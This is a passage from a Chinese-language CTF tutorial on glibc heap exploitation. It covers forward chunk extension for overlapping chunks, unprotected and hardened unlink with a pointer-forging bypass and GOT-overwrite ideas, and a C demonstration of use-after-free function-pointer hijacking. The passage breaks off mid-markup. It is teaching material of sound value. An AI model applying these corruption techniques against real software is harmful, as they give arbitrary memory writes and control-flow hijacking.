attack</code></p><hr><h2 id="通过-extend-前向-Overlap"><a href="#通过-extend-前向-Overlap" class="headerlink" title="通过 extend 前向 Overlap"></a>通过 extend 前向 Overlap</h2><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>ptr1<span class="token punctuation">,</span> <span class="token operator">*</span>ptr2<span class="token punctuation">,</span> <span class="token operator">*</span>ptr3<span class="token punctuation">,</span> <span class="token operator">*</span>ptr4<span class="token punctuation">;</span>
    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// smallbin1</span>
    ptr2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// fastbin1</span>
    ptr3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// fastbin2</span>
    ptr4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// smallbin2</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 防止与 top 合并</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> ptr4 <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x90</span><span class="token punctuation">;</span>   <span class="token comment">// 修改 pre_inuse 域</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> ptr4 <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>   <span class="token comment">// 修改 pre_size 域</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr4<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// unlink 进行前向 extend</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x150</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 占位块</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当 <code>malloc</code> 分配五个堆块后：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A820.png" alt="CTF - PWN_堆相关的漏洞与利用20.png"></p><p>此时 <code>free</code> 掉 <code>chunk1</code> 使其置入 <code>unsorted bin</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A821.png" alt="CTF - PWN_堆相关的漏洞与利用21.png"></p><p>修改 <code>chunk4</code> 的 <code>size</code> 域为 <code>0x90</code>（其中 <code>pre_inuse</code> 位为 0，代表前一个 <code>chunk</code> 空闲）</p><p>修改 <code>pre_size</code> 域为 <code>0xd0</code>（包括了 <code>chunk2</code> 和 <code>chunk3</code> 的大小）：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A822.png" alt="CTF - PWN_堆相关的漏洞与利用22.png"></p><p>此时 <code>free</code> 掉 <code>chunk4</code>，会导致 <code>chunk2</code> 和 <code>chunk3</code> 也一并被 <code>free</code>，同时与 <code>free</code> 掉 <code>chunk1</code> 后形成的 <code>unsorted bin</code> 合并：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A823.png" alt="CTF - PWN_堆相关的漏洞与利用23.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A824.png" alt="CTF - PWN_堆相关的漏洞与利用24.png"></p><p>在 <code>malloc(0x150)</code> 对 <code>extend</code> 区域重新占位后，就可以得到&nbsp;<code>chunk1 + chunk2 + chunk3 + chunk4</code> 的堆块</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A825.png" alt="CTF - PWN_堆相关的漏洞与利用25.png"></p><p>前向 <code>extend</code> 利用了 <code>smallbin</code> 的 unlink 机制，通过修改 <code>pre_size</code> 域可以跨越多个 <code>chunk</code> 进行合并实现 <code>Overlap</code></p><hr><h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><blockquote><p><code>unlink()</code> 是 Glibc 中的一个宏，其目的是将某一个空闲 <code>chunk</code> 从其所处的 <code>bin</code> 中脱链</p><ul><li>在 <code>malloc_consolidate()</code> 函数中用于将 <code>fast bin</code> 中的空闲 <code>chunk</code> 整理到 <code>unsorted bin</code></li><li>在 <code>malloc()</code> 函数中用于将 <code>unsorted bin</code> 中的空闲 <code>chunk</code> 整理到 <code>small bin</code> 或者 <code>large bin</code>，以及在 <code>malloc()</code> 中获得堆空间时，均有可能调用 <code>unlink()</code> 宏</li></ul><p>参考文章：</p><ol><li><a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?target=aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsv">Unlink - CTF Wiki</a></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Morphy_Amo/article/details/122631424">【pwn学习】堆溢出（三）- Unlink和UAF_pwn unlink-CSDN博客</a></li></ol></blockquote><p>在利用 unlink 所造成的漏洞时，其实就是对 <code>chunk</code> 进行内存布局，然后借助 unlink 操作来达成修改指针的效果</p><p><code>unlink()</code> 的大致流程如下：</p><ol><li>首先根据 <code>chunk P</code> 的 <code>fd</code> 和 <code>bk</code> 参数确定 <code>chunk P</code> 在 <code>bin</code> 中的前后 <code>chunk</code> 分别为 <code>FD</code> 和 <code>BK</code></li><li>然后让 <code>chunk FD</code> 的 <code>bk</code> 参数指向 <code>chunk BK</code></li><li>最后让 <code>chunk BK</code> 的 <code>fd</code> 参数指向 <code>chunk FD</code></li></ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A826.png" alt="CTF - PWN_堆相关的漏洞与利用26.png"></p><hr><h2 id="没有防护的-unlink"><a href="#没有防护的-unlink" class="headerlink" title="没有防护的 unlink"></a>没有防护的 unlink</h2><blockquote><p>这是比较古老的 unlink 利用方法，没有对 <code>chunk</code> 的 <code>size</code> 检查和双向链表检查</p></blockquote><p>Glibc 中没有防护的 <code>unlink()</code> 宏定义：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">unlink</span><span class="token expression"><span class="token punctuation">(</span>AV<span class="token punctuation">,</span> P<span class="token punctuation">,</span> BK<span class="token punctuation">,</span> FD<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                            </span></span>
    FD <span class="token operator">=</span> P<span class="token operator">-&gt;</span>fd<span class="token punctuation">;</span>   <span class="token comment">//获取显式链表中前一个块 FD					      </span>
    BK <span class="token operator">=</span> P<span class="token operator">-&gt;</span>bk<span class="token punctuation">;</span>   <span class="token comment">//获取显示链表中后一个块 BK              </span>
    FD<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>  <span class="token comment">//设置FD的后一个块					      </span>
    BK<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>  <span class="token comment">//设置BK的前一个块</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>假设堆内存最初的布局如图（32 位程序）：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A827.png" alt="CTF - PWN_堆相关的漏洞与利用27.png"></p><p>上图中有两个物理空间连续的 <code>chunk</code>，分别是 <code>Q</code> 和 <code>Nextchunk</code>，并且 <code>Q</code> 处于使用状态，<code>Nextchunk</code> 处于释放状态</p><p>如果我们通过某种方式（比如：溢出）将 <code>Nextchunk</code> 的 <code>fd</code> 和 <code>bk</code> 指针修改为指定的值，则当我们 <code>free(Q)</code> 时，会发生如下步骤：</p><ol><li>Glibc 判断 <code>chunk Q</code> 是 <code>small chunk</code></li><li>判断前向合并，发现前一个 <code>chunk</code> 处于使用状态，不需要前向合并</li><li>判断后向合并，发现后一个 <code>chunk</code> 处于空闲状态，需要合并</li><li>继而对 <code>Nextchunk</code> 采取 unlink 操作</li></ol><p>按照前面所提到的 <code>unlink()</code> 的大致流程，可以将该过程总结如下：</p><ol><li><code>FD = P -&gt; fd = target addr - 12</code></li><li><code>BK = P -&gt; bk = expect value</code></li><li><code>FD -&gt; bk = BK</code>，即：<code>*(target addr - 12 + 12) = BK = expect value</code></li><li><code>BK -&gt; fd = FD</code>，即：<code>*(expect value + 8) = FD = target addr - 12</code></li></ol><p>这样一来，我们可以通过 unlink 直接实现任意地址读写的目的，但是还是需要确保 <code>expect value + 8</code> 的地址处具有可写的权限</p><blockquote><p>例如将 <code>target addr</code> 设置为某个 GOT 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值 <code>expect value</code> 处的代码</p><p><strong>需要注意的是，<code>expect value + 8</code> 处的值被破坏了，需要想办法绕过</strong></p></blockquote><hr><h2 id="存在防护的-unlink"><a href="#存在防护的-unlink" class="headerlink" title="存在防护的 unlink"></a>存在防护的 unlink</h2><blockquote><p>目前的 unlink 通常是存在检查的，此时就没有那么简单了</p></blockquote><p>由于 unlink 的危险性，Glibc 添加了一些检测机制，存在防护的 <code>unlink()</code> 宏如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* Take a chunk off a bin list */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">unlink</span><span class="token expression"><span class="token punctuation">(</span>AV<span class="token punctuation">,</span> P<span class="token punctuation">,</span> BK<span class="token punctuation">,</span> FD<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                            </span><span class="token punctuation">\</span>
    <span class="token expression">FD <span class="token operator">=</span> P<span class="token operator">-&gt;</span>fd<span class="token punctuation">;</span>								      </span><span class="token punctuation">\</span>
    <span class="token expression">BK <span class="token operator">=</span> P<span class="token operator">-&gt;</span>bk<span class="token punctuation">;</span>								      </span></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-&gt;</span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-&gt;</span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>		      \
      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>  \
    <span class="token keyword">else</span> <span class="token punctuation">{</span>								      \
        FD<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>							      \
        BK<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>							      \
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>P<span class="token operator">-&gt;</span>size<span class="token punctuation">)</span>				      \
            <span class="token operator">&amp;&amp;</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>		      \
	    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-&gt;</span>fd_nextsize<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>	      \
		<span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    \
	      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span>				      \
			       <span class="token string">"corrupted double-linked list (not small)"</span><span class="token punctuation">,</span>    \
			       P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>					      \
            <span class="token keyword">if</span> <span class="token punctuation">(</span>FD<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>				      \
                <span class="token keyword">if</span> <span class="token punctuation">(</span>P<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">==</span> P<span class="token punctuation">)</span>				      \
                  FD<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> FD<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>		      \
                <span class="token keyword">else</span> <span class="token punctuation">{</span>							      \
                    FD<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-&gt;</span>fd_nextsize<span class="token punctuation">;</span>			      \
                    FD<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-&gt;</span>bk_nextsize<span class="token punctuation">;</span>			      \
                    P<span class="token operator">-&gt;</span>fd_nextsize<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>			      \
                    P<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>			      \
                  <span class="token punctuation">}</span>							      \
              <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>							      \
                P<span class="token operator">-&gt;</span>fd_nextsize<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-&gt;</span>bk_nextsize<span class="token punctuation">;</span>		      \
                P<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-&gt;</span>fd_nextsize<span class="token punctuation">;</span>		      \
              <span class="token punctuation">}</span>								      \
          <span class="token punctuation">}</span>								      \
      <span class="token punctuation">}</span>									      \
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，对 <code>fd</code> 和 <code>bk</code> 的检查：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// fd bk</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-&gt;</span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-&gt;</span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                      \
  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>  \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果按照没有防护的 unlink 中提到的场景，当前：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">FD <span class="token operator">-&gt;</span> bk <span class="token operator">=</span> target addr <span class="token operator">-</span> <span class="token number">12</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">=</span> target addr
BK <span class="token operator">-&gt;</span> fd <span class="token operator">=</span> expect value <span class="token operator">+</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但在这种情况下，修改 GOT 表项的方法可能就不可用了</p><p>不过，我们可以通过伪造的方式绕过这个机制：</p><p>首先通过覆盖，将 <code>Nextchunk</code> 的 <code>FD</code> 指针指向 <code>fakeFD</code>，将 <code>Nextchunk</code> 的 <code>BK</code> 指针指向 <code>fakeBK</code></p><p>为了通过验证，需要满足：</p><ul><li><code>fakeFD -&gt; bk == P</code>，即：<code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code>，即：<code>*(fakeBK + 8) == P</code></li></ul><p>当满足上述两式时，可以进入 unlink 的环节，进行如下操作：</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code>，即：<code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code>，即：<code>*(fakeBK + 8) = fakeFD</code></li></ul><p>如果让 <code>fakeFD + 12</code> 和 <code>fakeBK + 8</code> 指向同一个指向 P 的指针，那么：</p><ul><li><code>*P = P - 8</code></li><li><code>*P = P - 12</code></li></ul><p>通过这种方式，P 的指针指向了比自己低 12 的地址处</p><blockquote><p>此方法虽然不可以实现任意地址写，但是可以修改指向 <code>chunk</code> 的指针，这样的修改是可以达到一定的效果的</p></blockquote><p>如果我们想要使得两者都指向 P，只需要按照如下方式修改即可：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A828.png" alt="CTF - PWN_堆相关的漏洞与利用28.png"></p><p>由于 P 在 unlink 前是指向正确的 <code>chunk</code> 的指针，因此不受如下检测的影响：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">prev_size</span> <span class="token punctuation">(</span><span class="token function">next_chunk</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      \
  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted size vs. prev_size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>如果我们设置 <code>Nextchunk</code> 的 <code>fd</code> 和 <code>bk</code> 均为 <code>Nextchunk</code> 的地址也是可以绕过上面的检测的</p><p>但是这样不能达到修改指针内容的效果</p></blockquote><hr><h2 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h2><p>利用 unlink 漏洞的条件：</p><ol><li>存在 UAF 漏洞，可修改 <code>free</code> 状态下 <code>small bin</code> 或是 <code>unsorted bin</code> 的 <code>fd</code> 和 <code>bk</code> 指针</li><li>已知位置存在一个指针指向可进行 UAF 的 <code>chunk</code></li></ol><p>实现的效果：使得已指向存在 UAF 漏洞的 <code>chunk</code> 的指针 <code>ptr</code> 变为 <code>ptr - 0x18</code></p><p>假设指向存在 UAF 漏洞的 <code>chunk</code> 的指针的地址为 <code>ptr</code>，则实现的主要步骤为：</p><ol><li>修改 <code>fd</code> 为 <code>ptr - 0x18</code></li><li>修改 <code>bk</code> 为 <code>ptr - 0x10</code></li><li>触发 unlink，<code>ptr</code> 处的指针会变为 <code>ptr - 0x18</code></li></ol><hr><h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><blockquote><p>Use After Free 简称 UAF，即：释放后使用漏洞，指一个内存块被释放之后再次被使用</p></blockquote><p>对于内存块释放之后的操作，有以下几种情况：</p><ol><li><p><strong>内存块被释放后，其对应的指针被设置为 NULL</strong>，然后再次使用，自然程序会崩溃</p></li><li><p><strong>内存块被释放后，其对应的指针没有被设置为 NULL</strong>，然后在它下一次被使用之前，<em>没有代码对这块内存块进行修改</em>，那么程序很有可能可以正常运转</p></li><li><p><strong>内存块被释放后，其对应的指针没有被设置为 NULL</strong>，但是在它下一次使用之前，<em>有代码对这块内存块进行了修改</em>，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题</p></li></ol><p>通常我们所说的 UAF 漏洞对应的就是 2 和 3</p><p>也就是说，<em>UAF 漏洞利用的前提是：内存块被释放后，其对应的指针没有被设置为 NULL</em></p><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">name</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>myname<span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> NAME<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">myprint</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">printmyname</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"call print my name\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  NAME <span class="token operator">*</span>a<span class="token punctuation">;</span>
  a <span class="token operator">=</span> <span class="token punctuation">(</span>NAME <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  a <span class="token operator">-&gt;</span> func <span class="token operator">=</span> myprint<span class="token punctuation">;</span>
  a <span class="token operator">-&gt;</span> myname <span class="token operator">=</span> <span class="token string">"I can also use it"</span><span class="token punctuation">;</span>
  a <span class="token operator">-&gt;</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"this is my function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token comment">// free without modify</span>
  a <span class="token operator">-&gt;</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"I can also use it"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token comment">// free with modify</span>
  a <span class="token operator">-&gt;</span> func <span class="token operator">=</span> printmyname<span class="token punctuation">;</span>
  a <span class="token operator">-&gt;</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"this is my function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token comment">// set NULL</span>
  a <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this pogram will crash...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  a <span class="token operator">-&gt;</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"can not be printed..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A829.png" alt="CTF - PWN_堆相关的漏洞与利用29.png"></p><ul><li><p>即使 <code>free</code> 掉了 <code>chunk a</code>，我们依然可以通过 <code>a -&gt; func("I can also use it")</code> 调用 <code>myprint()</code> 打印输出</p></li><li><p>即使 <code>free</code> 掉了 <code>chunk a</code>，将 <code>a -&gt; func</code> 修改为 <code>printmyname()</code>，也可以正常使用 <code>printf("call print my name\n")</code> 功能</p></li><li><p>但是当 <code>chunk a</code> 被置为 NULL 后，<code>a -&gt; func("can not be printed...")</code> 便无法使用</p></li></ul><p>接下来，我们通过 GDB 调试分析一下整个过程</p><p>在执行 <code>free(a)</code> 之前，堆布局如下：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" 